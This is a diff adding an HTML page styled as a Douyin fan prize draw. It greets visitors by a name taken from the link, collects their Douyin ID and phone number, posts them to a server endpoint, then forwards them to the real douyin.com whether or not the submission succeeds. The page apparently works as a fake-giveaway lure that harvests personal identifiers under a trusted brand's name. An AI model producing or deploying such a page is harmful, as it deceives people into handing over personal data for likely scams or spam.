@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>抖音粉丝抽奖</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+            background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
+            min-height: 100vh;
+            color: #fff;
+        }
+        h1 {
+            color: #ffd700;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            font-size: 2.5em;
+        }
+        p {
+            font-size: 1.2em;
+            color: #f7fff7;
+        }
+        input {
+            padding: 12px;
+            margin: 10px;
+            width: 250px;
+            border: 2px solid #ff69b4;
+            border-radius: 25px;
+            font-size: 1em;
+            background-color: rgba(255, 255, 255, 0.95);
+            transition: all 0.3s ease;
+        }
+        input:focus {
+            border-color: #ff4500;
+            box-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
+            outline: none;
+        }
+        button {
+            padding: 12px 30px;
+            background: linear-gradient(45deg, #ff4500, #ff69b4);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(255, 69, 180, 0.4);
+        }
+        button:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+    <h1>抖音粉丝抽奖活动</h1>
+    <p id="greeting">朋友，输入你的抖音ID，参与抽奖赢大礼！</p>
+    <input type="text" id="douyinID" placeholder="请输入抖音ID"><br>
+    <input type="text" id="phone" placeholder="请输入手机号（可选）"><br>
+    <button onclick="submitData()">提交</button>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name') || '朋友';
+        document.getElementById('greeting').innerText = `${name}，输入你的抖音ID，参与抽奖赢大礼！`;
+
+        function submitData() {
+            let id = document.getElementById("douyinID").value;
+            let phone = document.getElementById("phone").value;
+            fetch('/save', {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ douyinID: id, phone: phone })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message);
+                window.location.href = "https://www.douyin.com";
+            })
+            .catch(() => {
+                alert("提交失败，但我们仍将带你前往抖音官网！");
+                window.location.href = "https://www.douyin.com";
+            });
+        }
+    </script>
+</body>
+</html>
